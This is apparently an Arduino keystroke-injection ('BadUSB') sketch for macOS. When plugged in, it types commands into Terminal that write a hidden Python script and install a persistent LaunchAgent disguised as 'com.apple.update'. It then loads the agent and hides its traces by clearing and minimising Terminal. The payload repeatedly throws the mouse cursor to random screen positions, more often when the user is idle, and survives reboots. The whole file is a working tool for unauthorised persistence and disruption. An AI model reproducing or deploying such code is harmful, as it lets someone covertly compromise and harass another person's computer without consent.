#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);

  ln("cat>~/.j.py<<'E'");
  delay(300);
  ln("import subprocess,time,random");
  ln("from Quartz import CGWarpMouseCursorPosition,CGSessionCopyCurrentDictionary,CGEventSourceSecondsSinceLastEventType");
  ln("");
  ln("def plugged():");
  ln(" try:");
  ln("  r=subprocess.run(['hidutil','list'],capture_output=1,text=1,timeout=2)");
  ln("  return '16c0' in r.stdout.lower()");
  ln(" except:return False");
  ln("");
  ln("def locked():");
  ln(" try:");
  ln("  d=CGSessionCopyCurrentDictionary()");
  ln("  return bool(d.get('CGSSessionScreenIsLocked',0))");
  ln(" except:return False");
  ln("");
  ln("def idle():");
  ln(" return CGEventSourceSecondsSinceLastEventType(1,0xFFFFFFFF)");
  ln("");
  ln("def go_crazy():");
  ln(" end=time.time()+2");
  ln(" while time.time()<end:");
  ln("  CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))");
  ln("  time.sleep(0.05)");
  ln("");
  ln("i=600");
  ln("while 1:");
  ln(" if locked():");
  ln("  time.sleep(5)");
  ln("  continue");
  ln(" if idle()>=65:");
  ln("  go_crazy()");
  ln("  continue");
  ln(" if plugged():time.sleep(3)");
  ln(" else:");
  ln("  time.sleep(i)");
  ln("  if i>120:i-=60");
  ln(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))");
  ln("E");
  delay(300);
  ln("mkdir -p ~/Library/LaunchAgents");
  ln("cat>~/Library/LaunchAgents/com.apple.update.plist<<E");
  ln("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
  ln("<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$HOME/.j.py</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>");
  ln("E");
  delay(300);
  ln("python3 -m pip install --user pyobjc-framework-Quartz -q;launchctl load ~/Library/LaunchAgents/com.apple.update.plist;clear;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
  Keyboard.end();
}
void loop() {}
